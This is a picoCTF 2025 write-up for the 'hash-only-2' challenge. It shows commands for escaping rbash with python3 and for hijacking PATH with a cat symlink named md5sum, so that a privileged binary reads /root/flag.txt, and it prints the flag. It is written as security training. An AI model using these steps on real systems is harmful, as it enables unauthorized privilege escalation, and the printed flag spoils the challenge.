# hash-only-2 #
 
## Overview ##

Category: [Binary Exploitation](../../)

Topics: Binary Exploitation, picoCTF-2025, Path Hijacking, Restricted Shell Escape

## Description ##
Here is a binary that has enough privilege to read the content of the flag file but will only let you know its hash. If only it could just give you the actual content!

## Approach ##
This challenge does not provide a direct download link for the binary, so interaction is intended through an SSH session. I connected to the instance via SSH to run the binary: 

    ctf-player@pico-chall$ flaghasher
    Computing the MD5 hash of /root/flag.txt....

    7ce6743af49f1083a6536f462670e13e  /root/flag.txt

Everything seems to be the same as the previous challenge. But when I decided to perform the same method as before:

    ctf-player@pico-chall$ echo $PATH
    /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
    ctf-player@pico-chall$ ln -s /bin/cat md5sum
    ctf-player@pico-chall$ export PATH=".":$PATH
    -rbash: PATH: readonly variable
    ctf-player@pico-chall$ cd ~
    -rbash: cd: restricted

I realize that I seem to be in a restricted shell. So it seems like I need to escape the restricted shell and then perform the same method like I did in the previous challenge. This restricted shell seems to be called rbash, so I search up ways to escape rbash. After clicking on an arbitrary article on it, I learned that one way to escape rbash is to use python to spawn a new shell. Luckily, python is available in this restricted environment so I wrote a simple python script:

    ctf-player@pico-chall$ python3 -c 'import os; os.system("/bin/bash");'
    ctf-player@challenge:~$ cd ../
    ctf-player@challenge:/home$ ls
    ctf-player
    ctf-player@challenge:/home$ cd ctf-player/

Now that I've escaped the restricted shell, I can proceed with the same technique as before:

    ctf-player@challenge:~$ ln -s /bin/cat md5sum
    ctf-player@challenge:~$ export PATH=".":$PATH
    ctf-player@challenge:~$ echo $PATH
    .:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
    ctf-player@challenge:~$ flaghasher
    Computing the MD5 hash of /root/flag.txt....

    picoCTF{Co-@utH0r_Of_Sy5tem_b!n@riEs_d23b83dc}

Flag: picoCTF{Co-@utH0r_Of_Sy5tem_b!n@riEs_d23b83dc}

## Reflection ## 
This challenge is basically the same as hash-only-1, but introduces an additional defensive layer through the use of a restricted shell (rbash). While rbash prevents common actions such as modifying PATH, changing directories, or executing commands with absolute paths, it is only effective if all escape mechanisms are properly removed. In this case, the presence of Python allowed an easy escape by spawning an unrestricted shell, effectively bypassing all imposed limitations. Once outside of rbash, the same PATH hijacking technique from the previous challenge could be applied to replace md5sum with a malicious symlink to cat, causing the privileged binary to reveal the flag contents directly. Proper sandboxing requires eliminating or heavily restricting such tools to prevent privilege escalation.

## Reference ##
https://www.hacknos.com/rbash-escape-rbash-restricted-shell-escape/



